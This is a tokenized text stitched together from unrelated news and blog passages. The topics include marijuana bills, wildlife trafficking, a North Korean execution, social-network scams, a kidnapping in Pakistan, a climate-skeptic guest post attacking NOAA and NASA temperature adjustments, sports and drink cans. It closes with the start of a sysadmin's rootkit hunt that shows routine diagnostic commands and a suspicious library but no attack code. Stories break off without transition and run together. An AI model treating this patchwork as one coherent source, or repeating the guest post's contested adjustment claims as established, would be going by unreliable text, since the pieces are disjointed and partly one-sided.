If marijuana use is going to be legalized in Washington this year , voters will have to do it because legislators wo n’t .
On Wednesday , the House Public Safety and Emergency Preparedness Committee is expected to vote down bills dealing with legalization and decriminalization of marijuana .
Rep. Chris Hurst , chariman of the public safety panel , told me there are not enough votes to move either bill out of committee .
While amendments to one or both bills could be proposed Wednesday , he did not envision enough minds would change to alter the outcome .
There are five Democrats and three Republicans on the committee .
The Republicans will unite against the bills .
Hurst and Rep. Al O’Brien , D - Mountlake Terrace , both former cops , each said they will oppose the bills .
Hurst said votes could have been taken last week at the end of a two - hour hearing on the legislation .
Sponsors of the bills requested time to ponder possible changes in response to criticism raised in the hearing .
He ’s pushing to get the matter resolved to give backers of an initiative for legalization a clear field on which to wage their fight .
The issue is not completely stubbed out in the Legislature .
A Senate bill decriminalizing use is still alive though no hearings on it have been scheduled as of this morning .
Whole species disappear from the wild as millions of animals are illegally exported round the world in a business with profit margins that rival the drugs trade
Countries across south - east Asia are being systematically drained of wildlife to meet a booming demand for exotic pets in Europe and Japan and traditional medicine in China – posing a greater threat to many species than habitat loss or global warming .
More than 35 million animals were legally exported from the region over the past decade , official figures show , and hundreds of millions more could have been taken illegally .
Almost half of those traded were seahorses and more than 17 million were reptiles .
About 1 million birds and 400,000 mammals were traded , along with 18 million pieces of coral .
The situation is so serious that experts have invented a new term – empty forest syndrome – to describe the gaping holes in biodiversity left behind .
" There 's lots of forest where there are just no big animals left , " says Chris Shepherd of Traffic , the wildlife trade monitoring network .
" There are some forests where you do n't even hear birds . "
Seahorses , butterflies , turtles , lizards , snakes , macaques , birds and corals are among the most common species exported from countries such as Malaysia , Indonesia and Vietnam .
Much of the business is controlled by criminal gangs , Shepherd says , and many of the animals end up in Europe as pets .
The rarer the species , the greater the demand and the higher the price .
Collectors will happily pay several thousand pounds for a single live turtle .
Vincent Nijman , a researcher at Oxford Brookes University who has investigated the trade , said : " We see species that are in fashion traded in great numbers until they are wiped out and people can't get them any more .
So another one comes in , and then that is wiped out , and then another comes in . "
He added : " In Asia , everybody knows the value of wildlife , so people go into the forest and , whatever they encounter , they know it has a value and that there is someone they can sell it to . "
Nijman 's research offers the first glimpse of the size of this widespread trade .
While most people are aware of illegal sales of rhino horn and ivory , he says it is the scale of the movement of lesser - known species that is most disturbing .
He analysed 53,000 records of imports and exports from countries under Cites , the international convention that regulates the sale of wildlife .
Most common species are not listed under Cites , so do not appear in the records .
Trade in the most endangered , such as rhino and tiger , is banned .
Nijman looked at species considered vulnerable enough that trade is allowed , but controlled .
" I 'm not against the wildlife trade at all .
I think it is a very important economic driver for a large part of the region and a lot of people are dependent on it , " he said .
" But it has to be done in such a way that you do n't finish it all this year .
It 's not like oil , where you drill it out and then it 's gone .
If you organise and regulate it properly , it should go on for ever . "
Cites records between 1998 and 2007 showed that of more than 35 million animals exported during that period , some 30 million were taken from the wild .
The EU and Japan were among the most significant importers .
For some mammal species , the proportion sourced from the wild dropped significantly over the decade , and traders were forced to rely increasingly on captive - bred animals .
Official trade in birds virtually disappeared by 2007 , probably because of bird flu restrictions .
The bulk of seahorses traded were in the form of dried specimens for Chinese medicine .
" The moment you look into the wildlife trade in south - east Asia , China is the biggest challenge , because they can use everything and they will use everything . "
Trade in the Asian pangolin , a scaly anteater , illustrates the problem .
Officially , countries do not allow their commercial sale and agreed a zero quota under Cites in 2000 , though regular seizures show widespread trade , for medicine and meat .
" The countries closest to China get emptied [ of pangolin ] first .
Vietnam and Laos have been drained .
Myanmar has been drained and they are working south , so now Indonesia is being emptied of pangolins , " Shepherd says .
" Prices are very high and in the next few years we will see pangolins being sucked out of Africa to supply the demand . "
Nijman says his analysis of the Cites records , published in the journal Biodiversity and Conservation , inevitably underestimates the scale of the trade .
" There is always an unknown quantity of Cites - listed species that are traded without being reported , and on top of that , probably much larger , is the trade in non-Cites species , which are the species that we think are still common enough to be traded without controls . "
One of these is the tokay gecko .
" Every­one who has been to Indonesia or Malaysia will know them because they are the ones that sit in your hotel room .
You have them everywhere . "
Although not listed by Cites , Indonesia has set a limit of 45,000 of the lizards exported each year as pets .
Nijman says the true number traded is much higher , perhaps into the millions .
" We can't say whether a million tokay geckos being traded a year , or two million , is too many .
Perhaps there are so many it is OK .
But you would think that if they set the quota at 45,000 then a million is too much . "
Such geckos can be typically bought in rural villages for a few cents each , and sold for $ 10 – a profit margin that rivals the drugs trade .
" It 's a great business .
No wonder organised crime gets involved and starts running things , " Shepherd says .
" In Malaysia if you get caught selling drugs you get the death penalty .
For wildlife crime the maximum fine is about $ 5,000 . "
The situation is acute in south - east Asia , but the trade , both legal and illegal , is global , often using the internet and courier delivery .
For $ 4,000 , an illegal trader based in Indonesia will send a three - year - old ploughshare tortoise from Madagascar , one of the most endangered animals in the world .
Other species sell for as much as $ 20,000 , though Nijman and Shepherd do not want to advertise which ones .
" People do know about the rhinos and the tigers , but the vast majority of this trade is in stuff that they did n't know existed , " said Shepherd .
" A handful of people are getting very rich and most people are getting screwed out of their natural resources . "

A family 's moral codes are tested when Ray Tierney investigates a case that reveals an incendiary police corruption scandal involving his own brother - in - law .
For Ray , the truth is revelatory , a Pandora 's Box that threatens to upend not only the Tierney legacy but the entire NYPD .
A North Korean factory worker has been executed by firing squad for sneaking news out of the country on his illicit mobile phone , Seoul - based radio said today .
The armaments factory worker was accused of divulging the price of rice and other information on living conditions to a friend who had defected to South Korea years ago , Open Radio for North Korea reported .
The man , surnamed Chong , made calls to the defector using an illegal Chinese mobile phone , according to an unnamed North Korean security agency official cited by the report .
The execution took place by firing squad in late January in Hamhung , according to Open Radio for North Korea .
The station broadcasts into North Korea , which tightly controls news .
South Korea 's unification ministry , which handles relations with North Korea , and the national intelligence service , Seoul 's main spy agency , said they could not immediately confirm the report .
Mobile phone use in North Korea is tightly restricted , although the country introduced an advanced network in partnership with Cairo - based Orascom Telecom in 2008 .
North Koreans who manage to make illegal overseas mobile calls mostly use networks in China .
Open Radio for North Korea said it believes that more than 10,000 North Koreans living near the border with China illicitly possess Chinese mobile phones .
Ha Tae - keung , the broadcaster 's chief , said it was not known to whom in South Korea the information passed on by Chong was eventually delivered .
The North Korean defector said to have received the calls , only identified by the common Korean family name of Kim , may have worked for South Korean government officials , researchers or news outlets , Ha said .
Ha said neither the executed man nor the defector had worked for Open Radio for North Korea .
WASHINGTON D.C. --
You see it all the time on Facebook : A friend moving on up in FarmVille .
Another friend trying to expand his posse in Mafia Wars .
Everyone thinks of them as harmless third - party applications , free from the crooks and cooks of cyberspace .
Unfortunately , that 's not the case .
The sad fact is that these applications are susceptible to malware pushers and those looking to steal your personal information .
It 's not much of a stretch for hackers to impersonate people you think are trusted , fellow players , as is the case with a lot of online gaming .
And the more you expose yourself , the bigger the target you become .
The dangers of these games were part of a larger talk on social networking dangers at the 2010 ShmooCon security conference .
Indeed , social networkers are in danger from all corners , be it from malicious Twitter bots you think is a celebrity following you or that hot model who friended you on Facebook , hoping you would n't notice that she 's nothing more than a phishing hook .
In their talk , " Social Zombies II : Your Friends Need More Brains , " security practitioners Tom Eston , Kevin Johnson and Robin Wood continued what they started in their " Social Zombies : Your Friends want to eat Your Brains " presentation at DEFCON 17 .
They presented new techniques and tools used to exploit people on these social networks .
They also examined how all your profile information is being used against you and eroding your privacy [ related story : 6 Ways We Gave Up Our Privacy ] .
" Facebook has 350 million users with 12 million logging in daily .
Twitter is getting 6.2 million new users a month .
The target base keeps growing , " said Eston , a penetration tester for a Fortune 500 financial services organization .
In one of their more colorful examples , the trio explained how actress Jessica Biel is the most dangerous woman on the Internet because of all the fake profiles of her scattered throughout the social networking landscape .
People on Twitter are easily duped into thinking Biel is following them in Twitter .
The Facebook folks proudly count her among their friends , not realizing the page is really under the control of a malicious operator who wants you to click on malicious links on the page .
Then there 's Blippy , a social network billed as a " fun and easy way to see and discuss the things people are buying . "
The presenters noted that penetration testers absolutely love this platform because of the naked insight it offers into the spending habits of specific individuals .
They also shared a favorite quote making its way around the infosec community : " I joined Blippy and all I got was jacked at the ATM . "
Another example is Foursquare , a social networking program that lets you keep track of where your friends are , literally .
If someone in your network is in South Korea or in front of the Alamo in Texas , Foursquare will tell you so .
Want to use it on your iPhone ?
There 's an app for that .
And for BlackBerries , too .
While it 's becoming increasingly difficult for people to turn away from social networking , especially since it 's become a critical , legitimate business tool for many professionals , there are still ways to protect yourself , the presenters noted .
For one thing , you can avoid Facebook and Twitter pages purporting to be from famous people .
A good way to tell if that Twitter page is really a malicious bot is to look at its follower / following ratio .
If they 're being followed by 50 people but are following over a thousand , that 's a pretty good indication that something stinks .
And , they noted , if you must use apps to get around certain places and find the shops you 're looking for , remember that too much information can be enough for someone evil to track your specific whereabouts and come after you .

A small earthquake measuring 3.2 on the Richter scale has been recorded in Melbourne .
The tremor , which struck Port Phillip Bay , was felt across south - eastern suburbs just after 7:00 pm ( AEDT ) .
Senior seismologist with Environmental Systems and Services , Gary Gibson , says it is unusual for an earthquake to hit so close to the city .
" In Melbourne , quite rare .
In Victoria as a whole we'd get an earthquake of this size about every six weeks , " he said .
" Most of them are in remote areas and a lot of them are n't even felt .
" We had one only a couple of weeks back in Pearcedale , north of Hastings , a place that also had a few there last September . "
Mr Gibson says the tremor would have been felt across the south - eastern suburbs from Frankston to St Kilda .
" The depth was probably about 10 kilometres beneath the surface , " he said .
" The actual rupture for an earthquake of this size would 've taken place in less than a tenth of a second . "
June in Parkdale said her body shook when the tremor struck .
" I heard the roof of my house ... I thought there was either thunder or 15 possums up there , " she said .
" I literally saw my feet move on my floor and I thought , ' gee that 's definitely not possums , that 's an earthquake ' . "
Chris Auyeung and Vijay Mathews , the makers of the BeardMe iPhone App ( iTunes link ) believe everyone has the right to luxuriant , well - groomed facial hair .
BeardMe gives people the chance to put really well - designed , old timey , classy beards and mustaches on themselves and everyone they know .
Because really who does n’t love a Daniel Day - Lewis in “ Gangs of New York ” mustache on babies or coworkers or pets ?!
Plus , there really is something about a nice beard or mustache that adds a certain I do n’t know what to one ’s personality and general outlook on life .

It 's been well - established that experiencing sexual harassment has a negative effect on women .
But what about witnessing it ?
A new study from University of Connecticut researchers Stephenie Chaudoir and Diane Quinn suggests that simply being a bystander to sexism is enough to inspire women to report higher identification with women as a group , and heightened feelings of negativity toward men .
The effects of this " bystander sexism " help to explain how a cat - call targeted at one woman can work to demean all of us .
In the study , the researchers asked 114 female college students to watch one of two videos and imagine themselves as a witness to the scene that unfolds .
In the first version , a man approaches a woman and says , " Hey Kelly , your boobs look great in that shirt ! "
In the second , the man greets the woman by saying , " Hey Kelly , what 's up ? "
Study participants then completed a survey designed to show how strongly they identify themselves with women as a group , how much anger and fear they feel toward men as a group , and how likely they are to be prompted to either " move against " or " move away " from men in general .
Advertisement
The result ?
Even though women only graded the " boobs " comment as a " moderately prejudiced " thing to say , women who witnessed the harassment were more likely to identify as women , feel anger toward men , and express the desire to " move away " from men .
The fact that street harassment tends to divide men and women as classes is no secret .
Women who have experienced street harassment often report coping by responding with wariness to all strange men , in order to fend off possible future harassment .
And men express frustration that they can't approach a woman in a way they perceive as non-harassing - whether it's to ask for directions or deliver a compliment - without being regarded as a potential offender .
But the defensive strategy is often made necessary by the frequency of such harassment ; Chaudoir and Quinn note that " 42 % of U.S. female college students [ report ] that they are the direct targets of cat - calls at least once a month . "
And this casual sexism has serious effects on its victims : " the experience of street harassment is directly related to greater preoccupation with physical appearance and body shame , and is indirectly related to heightened fears of rape for U.S. undergraduate women . "

What the new study reveals is that harassment also has serious effects on women who are not victims - and men who are not harassers .
" It makes sense that if women feel like they have been discriminated against , or that specific men are engaging in sexist behaviors that can harm them , they 're going to be on high alert in the future from other men , even if those men have no intent of participating in the discrimination , " says Chaudoir .
For the men , " our data do speak to this unfortunate predicament where men who are not harassers and men who are not doing anything wrong end up being painted in the eyes of women , at least for some period of time , in a negative way , " Chaudoir says .
" For men who are doing nothing wrong , these [ harassers ] may be shaping the ways that they 're being perceived as well . "
Despite the depressingly divisive results here , this study shows that men and women alike have an investment in working to eliminate sexual harassment .
As Chaudoir and Quinn 's work demonstrates , harassment against women often occurs in public and in view of plenty of bystanders , male and female .
We all have the opportunity to make it clear that this sort of behavior is unacceptable .

Sahil Saeed was taken by robbers after a raid on his grandmother 's home
The kidnapping of young Briton Sahil Saeed has focused the international spotlight on one of Pakistan 's more murky secrets .
Kidnapping for ransom is one of the most profitable and widespread criminal enterprises in the country .
But it is one that has , until now , been fairly well hidden .
Five - year - old Sahil was kidnapped after armed men broke into his family home in the town of Jhelum in central Punjab province .
Since then , amid huge media attention , the police have been making an all - out effort to recover him .
Those efforts at the moment appear to have reached an impasse .
' Mistake '
" The main thing to do at the moment is not to lose hope , " says Jameel Yusuf , one of Pakistan 's top anti-kidnapping experts .
Mr Yusuf is the former head of the Citizen Police Liaison Committee ( CPLC ) , a unique joint venture between officers and citizens in Pakistan 's largest city of Karachi .
The committee was formed in 1990 to tackle abductions in collaboration with government security agencies .
Whoever made the decision to go public made a mistake
Jameel Yusuf
While the CPLC has broadened its functions , kidnapping for ransom has remained its forte .
Mr Yusuf has been involved in the investigation of more than 400 cases , most of which have been solved .
He was instrumental in the investigation into the kidnapping of US journalist Daniel Pearl , who was murdered by his captors , and played a key role in the arrest of the culprits .
Of the Sahil case , Mr Yusuf says : " Whoever made the decision to go public made a mistake .
" In a kidnapping for ransom , the best thing you can do is to keep the matter as quiet as possible .
" This goes doubly for a child , who is much more difficult to handle than an adult . "
The best person to speak to the kidnappers may be Sahil 's mother Mr Yusuf says it is clear from the facts that these are not professional kidnappers - the gangs who make abduction for ransom a regular trade in Pakistan .
It is a big business .
In 2009 , 480 people were officially recognised as having been kidnapped for ransom in Pakistan .
But the figure is misleading - as police try to separate kidnapping for ransom from simple kidnappings , which are related to what they term family incidents .
" The police often do this to lower crime statistics , " says Mr Yusuf .
" A person is listed as having been ' kidnapped ' if a family member , or a close friend or associate , is involved .
" The police only register the case as being ' kidnapping for ransom ' if a known gang of professional kidnappers is involved . "
Such gangs abound in Pakistan .
They are especially active in the industrial regions of the Punjab and in Karachi .
The targets are mostly rich businessmen and entrepreneurs or their family members .
The gangs often have a threefold set - up .
One team stakes out and kidnaps the target and then hands the victim to a middleman .
The middleman then transfers the person to a third party , who keeps the victim until a successful bargain is made .
This is usually in an area such as Pakistan 's tribal region , where police have no control .
Death penalty
While such organised gangs play a large role in Pakistan 's kidnapping industry , they are not the only ones involved .
Many smaller gangs or petty criminals are also active , especially in small rural communities or within the baradari ( trade - based community ) network of the Punjab .
The victims are usually known , or even related , to the culprits .
Mr Yusuf says " kidnapping " carries a penalty of up to life in jail , whereas " kidnapping for ransom " can carry the death penalty , which is often enforced .
If the cases of " kidnapping for ransom " in 2009 were below 500 in all of Pakistan , " kidnap " cases in Punjab alone were more than 11,000 in the same year .
Mr Yusuf says even these figures are not comprehensive .
The key is to communicate with the men - to tell them that the child they are holding is a loved person , not a commodity
Jameel Yusuf " Many cases are not reported as the families are not confident about the police and prefer to deal with the culprits themselves .
After all , it is literally a matter of life and death . "
Mr Yusuf thinks the criminals in the Sahil case are probably of the " kidnap " type .
" They are probably robbers or some other type of criminal who did not know what they were getting into .
" For this reason , I would be even more concerned for the security of the child . "
Mr Yusuf says two things need to be done immediately .
" First , step back and retreat from the publicity , which will have really scared the culprits .
" The police need to be told to keep a very low profile around the residence .
" The key is to communicate with the men - to tell them that the child they are holding is a loved person , not a commodity .
" The best person to do that would probably be the mother . "
This could be done by circulating a a new phone number that will only be answered by her within their immediate circle .
Mr Yusuf says : " As there is a strong possibility of someone within the larger family or community being involved , the news is likely to reach the men .
" This has to be done quickly - as every passing moment is a threat to the child 's wellbeing . "

The international Quartet of Middle East peace mediators has urged Israel to freeze all settlement activity .
Speaking for the Quartet , UN Secretary General Ban Ki-moon condemned Israel 's announcement of plans to build new homes in disputed East Jerusalem .
That move was criticised as undermining efforts to restart peace talks .
Speaking to the BBC , US Secretary of State Hillary Clinton indicated that hardening the tone with Israel had paid off , with talks now back in prospect .
Mr Ban met Mrs Clinton and the other Quartet foreign ministers - new EU foreign policy chief Baroness Ashton and Russia 's Sergei Lavrov - in Moscow .
[ The Quartet ] condemns the decision by the government of Israel to advance planning for new housing units in East Jerusalem

Jerusalem 's tinder - box Israel - US : Bruised friendship Borders and settlements
In a strongly worded statement , the Quartet condemned Israel 's announcement last week of planning permission for 1,600 new homes in East Jerusalem , occupied by Israel since 1967 .
After the announcement , the Palestinians declared they could not begin US - brokered indirect , or " proximity " , talks with the Israelis .
" The Quartet urges the government of Israel to freeze all settlement activity , including natural growth , dismantle outposts erected since March 2001 and to refrain from demolitions and evictions in East Jerusalem , " Mr Ban said .
" Recalling that the annexation of East Jerusalem is not recognised by the international community , the Quartet underscores that the status of Jerusalem is a permanent status issue that must be resolved through negotiations between the parties , and condemns the decision by the government of Israel to advance planning for new housing units in East Jerusalem . "
ANALYSIS Kim Ghattas , BBC News , Moscow
Hillary Clinton seems to believe that the spat over settlements with Israel might produce something positive .
In a BBC interview she appeared to concede that escalating the tone with the Israelis had been a risk but she said it was " paying off " .
She added she believed there would be a " resumption of the negotiating track soon " .
In other words , pressure on Israel is working .
But the pressure will have to continue if there are to be concrete results .
Israeli officials are already pushing back .
Mrs Clinton said Benjamin Netanyahu had committed to peace and she made clear she expected him to deliver .
She added it was his responsibility to bring the whole of his government , a right - wing coalition , on board .
Mr Ban stated the goal of an Israeli - Palestinian peace agreement - including a Palestinian state - within two years .
Palestinian chief negotiator Saeb Erekat welcomed the Quartet statement and urged the creation of a " surveillance mechanism installed by the Quartet to make sure that Israel does effectively halt completely all settlement activity in the West Bank and East Jerusalem " .
The pressure is now on the Israelis to offer concessions that will convince the Palestinians to participate in talks , says the BBC's Richard Galpin in Moscow .
But Israeli Foreign Minister Avigdor Lieberman said the Quartet timetable was unrealistic and ignored " the last 16 years of Israeli attempts " at negotiating with the Palestinians .
He said Israel had made many " significant gestures " and it was up to the Palestinians to " prove that they are really interested in negotiations " .
Mrs Clinton told the BBC she hoped to see the resumption of indirect talks in the near future , eventually moving to direct talks .
Asked whether she had taken a risk in escalating the tone with Israel , Mrs Clinton said : " I think we are going to see the resumption of the negotiating track , and that means that is paying off , because that is our goal . "
West Bank clashes Events on Friday in the Middle East highlighted the difficulties the Quartet faces .
Palestinians in the West Bank town of Hebron threw stones at Israeli security forces , who fired tear gas in return .

And a rocket was fired into southern Israel from the Gaza Strip .
It caused no injuries , but came a day after a rocket attack killed a Thai agricultural worker when it hit an Israeli kibbutz .
Israeli aircraft attacked up to six targets in Gaza overnight but there were no reports of any serious casualties .
On the eve of the Quartet meeting , Mr Netanyahu informed Mrs Clinton of new confidence - building measures that could be taken , but no details have been given .
It is likely this means a goodwill gesture by the Israelis , like the release of Palestinian prisoners , says the BBC's Kim Ghattas , travelling with Mrs Clinton .
Enough progress was apparently made in their telephone conversation for George Mitchell , Washington 's Middle East envoy , to travel to the region this weekend .
Mr Netanyahu is to visit Washington next week for further talks with Mrs Clinton .
At the heart of the conflict are disputes over the status of Jerusalem , the borders of Israel and a future Palestinian state and the fate of Palestinian refugees .

Guest post by David W. Schnare , Esq. Ph.D .
When Phil Jones suggested that if folks did n’t like his surface temperature reconstructions , then perhaps they should do their own , he was right .
The SPPI analysis of rural versus urban trends demonstrates the nature of the overall problem .
It does not , however , go into sufficient detail .
A close examination of the data suggests three areas needing address .
Two involve the adjustments made by NCDC ( NOAA ) and by GISS ( NASA ) .
Each made their own adjustments and typically these are serial , the GISS done on top of the NCDC .
The third problem is organic to the raw data and has been highlighted by Anthony Watts in his Surface Stations project .
That involves the “ micro- climate ” biases in the raw data .
As Watts points out , while there are far too many biased weather station locations , there remain some properly sited ones .
Examination of the data representing those stations provides a clean basis by which to demonstrate the peculiarities in the adjustments made by NCDC and GISS .
One such station is Dale Enterprise , Virginia .
The Weather Bureau has reported raw observations and summary monthly and annual data from this station since 1891 through the present , a 119 year record .
From 1892 to 2008 , there are only 9 months of missing data during this 1,404 month period , a missing data rate of less than 0.64 percent .
The analysis below interpolates for this missing data by using an average of the 10 years surrounding the missing value , rather than basing any back - filling from other sites .
This correction method minimizes the inherent uncertainties associated with other sites for which there is not micro-climate guarantee of unbiased data .
The site itself is in a field on a farm , well away from buildings or hard surfaces .
The original thermometer remains at the site as a back - up to the electronic temperature sensor that was installed in 1994 .
The Dale Enterprise station site is situated in the rolling hills east of the Shenandoah Valley , more than a mile from the nearest suburban style subdivision and over three miles from the center of the nearest “ urban ” development , Harrisonburg , Virginia , a town of 44,000 population .
Other than the shift to an electronic sensor in 1994 , and the need to fill in the 9 months of missing reports , there is no reason to adjust the raw temperature data as reported by the Weather Bureau .
Here is a plot of the raw data from the Dale Enterprise station .
There may be a step - wise drop in reported temperature in the post - 1994 period .
Virginia does not provide other rural stations that operated electronic sensors over a meaningful period before and after the equipment change at Dale Enterprise , nor is there publicly available data comparing the thermometer and electronic sensor data for this station .
Comparison with urban stations introduces a potentially large warm bias over the 20 year period from 1984 to 2004 .
This is especially true in Virginia as most such urban sites are typically at airports where aircraft equipment in use and the pace of operations changed dramatically over this period .
Notably , neither NCDC nor GISS adjusts for this equipment change .
Thus , any bias due to the 1994 equipment change remains in the record for the original data as well as the NCDC and GISS adjusted data .
The NCDC adjustment
Although many have focused on the changes GISS made from the NCDC data , the NCDC “ homogenization ” is equally interesting , and as shown in this example , far more difficult to understand .
NCDC takes the originally reported data and adjusts it into a data set that becomes a part of the United States Historical Climatology Network ( USHCN ) .
Most researchers , including GISS and the East Anglia University Climate Research Center ( CRU ) begin with the USHCN data set .
Figure 2 documents the changes NCDC made to the original observations and suggests why , perhaps , one ought begin with the original data .
The red line in the graph shows the changes made in the original data .
Considering the location of the Dale Enterprise station and the lack of micro-climate bias , one has to wonder why NCDC would make any adjustment whatever .
The shape of the red delta line indicates these are not adjustments made for purposes of correcting missing data , or for any obvious other bias .
Indeed , with the exception of 1998 and 1999 , NCDC adjusts the original data in every year !
[ Note , when a 62 year old Ph.D. scientist uses an exclamation point , their statement is rather to be taken with some extraordinary attention . ]
This graphic makes clear the need to “ push the reset button ” on the USHCN .
Based on this station , alone , one can argue the USHCN data set is inappropriate for use as a starting point for other investigators , and fails to earn the self - applied moniker as a “ high quality data set . ”
The GISS Adjustment
GISS states that their adjustments reflect corrections for the urban heat island bias in station records .
In theory , they adjust stations based on the night time luminosity of the area within which the station is located .
This broad - brush approach appears to have failed with regard to the Dale Enterprise station .
There is no credible basis for adjusting station data with no micro-climate bias conditions and located on a farm more than a mile from the nearest suburban community , more than three miles from a town and more than 80 miles from a population center of greater than 50,000 , the standard definition of a city .
Harrisonburg , the nearest town , has a single large industrial operation , a quarry , and is home to a medium sized ( but hard drinking ) university ( James Madison University ) .
Without question , the students at JMU have never learned to turn the lights out at night .
Based on personal experience , I ’m not sure most of them even go to bed at night .
This raises the potential for a luminosity error we might call the “ hard drinking , hard partying , college kids ” bias .
Whether it is possible to correct for that in the luminosity calculations I leave to others .
In any case , the lay out of the town is traditional small town America , dominated by single family homes and two and three story buildings .
The true urban core of the town is approximately six square blocks and other than the grain tower , there are fewer than ten buildings taller than five stories .
Even within this “ urban core ” there are numerous parks .
The rest of the town is quarter - acre and half - acre residential , except for the University , which has copious previous open ground ( for when the student union and the bars are closed ) .
Despite the lack of a basis for suggesting the Dale Enterprise weather station is biased by urban heat island conditions , GISS has adjusted the station data as shown below .
Note , this is an adjustment to the USHCN data set .
I show this adjustment as it discloses the basic nature of the adjustments , rather than their effect on the actual temperature data .
While only the USHCN and GISS data are plotted , the graph includes the ( blue ) trend line of the unadjusted actual temperatures .
The GISS adjustments to the USHCN data at Dale Enterprise follow a well recognized pattern .
GISS pulls the early part of the record down and mimics the most recent USHCN records , thus imposing an artificial warming bias .
Comparison of the trend lines is somewhat difficult to see in the graphic .
The trends for the original data , the USHCN data and the GISS data are : 0.24 ,
- 0.32 , and 0.43 degrees C. per Century , respectively .
If one presumes the USHCN data reflect a “ high quality data set ” , then the GISS adjustment does more than produce a faster rate of warming , it actually reverses the sign of the trend of this “ high quality ” data .
Notably , compared to the true temperature record , the GISS trend doubles the actual observed warming .
This data presentation constitutes only the beginning analysis of Virginia temperature records .
The Center for Environmental Stewardship of the Thomas Jefferson Institute for Public Policy plans to examine the entire data record for rural Virginia in order to identify which rural stations can serve as the basis for estimating long - term temperature trends , whether local or global .
Only a similar effort nationwide can produce a true “ high quality ” data set upon which the scientific community can rely , whether for use in modeling or to assess the contribution of human activities to climate change .

===================================
UPDATE : readers might be interested in the writeup NOAA did on this station back in 2002 here ( PDF , second story ) .
I point this out because initially NCDC tried to block the surfacestations project saying that I would compromise “ observer privacy ” by taking photos of the stations .
Of course I took them to task on it when we found personally descriptive stories like the one referenced above and they relented .

LeBron James is on pace to claim his second scoring title after topping the league in 2007 - 08 , when he was a year removed from leading the Cavaliers to the NBA Finals .
Given the choice of either , though , James was emphatic in claiming he could win the scoring championship at will .
But it 's the team titles that hold the key , he said .
" It 's not important to me at all .
I mean right now our team is in a position to try to clinch throughout the whole playoffs , " James said of home - court advantage Thursday in San Antonio , where the Cavaliers play the Spurs on Friday night .
" That 's what position we 're in right now .
If we can do that , that will be more important than a scoring title .
I mean , individual accolades take care of [ themselves ] . "
James , who led the league in minutes played and field goals in two of his first five seasons , picked up his only scoring title in his fourth year .
He again leads the NBA in scoring with 29.8 points per game , total points with 2,086 and field goals with 707 .
And the Cavs hold a comfortable position in the Eastern Conference standings , seven games in front of second - place Orlando with 10 games left in the regular season .
" If I really wanted to , " James said , " if I really wanted to be the scoring [ champion ] every single year -- every single year -- I could really do it .
But it does n't matter . "

Gamers have flooded a government inquiry to support the case for an R18 + rating for interactive games , but a Christian group opposed to the change has warned that the strong response was the result of a biased consultation process and that little weight should be attached to the gamers ' submissions .
The Attorney - General 's department is currently reviewing censorship rules that ban games with content beyond the current MA15 + rating , opening up the possibility R18 + games could be legalised in line with rules for films and DVDs .
Any change would have an impact on the ability for Australians to legally access games such as Left 4 Dead 2 , which was banned in Australia last year because of its " graphic depictions of blood and gore " .
A campaign by the gaming industry yielded tens of thousands of submissions from game designers and fans frustrated at being denied legal access to games available elsewhere because of what they say is the outdated perception that games are intended for children .
But the Australian Christian Lobby says the surge of submissions is the result of an flawed process that involved a biased discussion paper and encouraged people to fill in a simple template form .
Fizzy drink that you can reseal : Tab keeps contents bubbly for 24 hours
It 's a perennial problem for lovers of fizzy drinks .
You 've snapped open the ring pull and had a few slurps .
But now you 're full up - and you still have half a can of drink left .
And with no way of sealing it , you either have to leave it to go flat or throw it away .
Now , however , a solution is on the way for one of modern life 's many little irritations .
Seal of approval :
The new can can be shut by twisting the plastic tab by 180 degrees
A new ' twist and shut ' resealable drinks can is about to be launched in Britain .
The revolutionary design will allow consumers to reseal their fizzy drink after it has been opened , a development which could signal the end for traditional ring - pull cans .
The airtight device promises to stop spills and keep the contents bubbly for up to 24 hours .
Drinkers simply twist a plastic tab 180 degrees to break the seal and open the can , and twist it back to its original position to reseal their drink .
Open and shut case :
The 485 ml resealable cans will cost £ 1.19
American sportswear brand No Fear is to use the new can design when it launches a drink for sportsmen , Extreme Energy , in April .
It will be sold in 485 ml cans instead of the usual 330 ml size .
But the plastic seal is likely to make the cans more expensive to manufacture .
The No Fear drink is expected to sell at £ 1.19 a pop .
The drink is being marketed by Aimia Foods , based in Haydock , Merseyside .
Spokesman Neal Haworth said : ' The resealable technology allows people to drink the amount they want , when they want it .
' You do n't have to finish the can in one go as it can be resealed to stay fizzy .
It 's such a logical step for canned energy drinks . '
More than five billion aluminium cans are used in the UK each year and , if successful , the device could be used for other fizzy drinks .
Resealable cans have proved popular in the U.S. but the British launch is believed to be the first time they have been made available here .
Drinks iant Coca - Cola used a resealable design when it launched its energy drink in France .
It tried out a similar design in the Channel Islands , but said it had no plans to introduce the cans in the UK .
The first canned drinks had to be opened by punching holes into the lid with a sharp metal implement nicknamed a ' church key ' .
Canadian Mikola Kondakow reportedly invented the ring - pull in 1956 , but there were complaints that the detachable ring - pulls led to injuries and an increase in litter .
These problems were reduced after the introduction of ' stay - tabs ' in the 1980s .
The system of a scored lid , with a pull - tab used as a lever to punch a hole to open the can , remains the most widely used drinks can in the world .
Part 1 : Finding the rootkit
It ’s monday morning and I am for coffee in downtown Thessaloniki , a partner calls :
– On machine XXX mysqld is not starting since Saturday .
– Can I drink my coffee and come over later to check it ?
Is it critical ?
– Nope , come over anytime you can …
Around 14:00 I go over to his company to check on the box .
It ’s a debian oldstable ( etch ) that runs apache2 with xoops CMS + zencart ( version unknown ) , postfix , courier - imap (s ) / pop3 (s ) , bind9 and mysqld .
You can call it a LAMP machine with a neglected CMS which is also running as a mailserver …
I log in as root , I do a ps ax and the first thing I notice is apache having more than 50 threads running .
I shut apache2 down via /etc / init.d/ apache2 stop .
Then I start poking at mysqld .
I ca n’t see it running on ps so I try starting it via the init.d script .
Nothing … it hangs while trying to get it started .
I suspect a failing disk so I use tune2fs - C 50 / dev/hd a1 to force an e2fck on boot and I reboot the machine .
The box starts booting , it checks the fs , no errors found , it continues and hangs at starting mysqld .
I break out of the process and am back at login screen .
I check the S.M.A.R.T. status of the disk via smartctl - a / dev/hda , all clear , no errors found .
Then I try to start mysqld manually , it looks like it starts but when I try to connect to it via a mysql client I get no response .
I try to move / var / lib / mysql / files to another location and to re-init the mysql database .
Trying to start mysqld after all that , still nothing .
Then I try to downgrade mysql to the previous version .
Apt - get process tries to stop mysqld before it replaces it with the older version and it hangs , I try to break out of the process but it ’s impossible … after a few killall - 9 mysqld_safe ; killall - 9 mysql ; killall - 9 mysqladmin it finally moves on but when it tries to start the downgraded mysqld version it hangs once again .
That ’s totally weird …
I try to ldd /usr / sbin / mysqld and I notice a very strange library named / lib/ld- linuxv.so.1 in the output .
